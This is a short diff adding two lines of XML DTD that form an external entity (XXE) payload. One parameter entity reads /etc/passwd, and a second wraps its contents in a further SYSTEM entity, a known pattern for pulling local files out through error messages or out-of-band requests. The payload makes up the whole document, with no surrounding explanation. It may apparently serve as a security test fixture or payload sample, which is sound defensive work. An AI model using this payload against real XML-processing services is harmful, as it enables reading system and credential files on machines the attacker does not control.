@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd" >
+<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
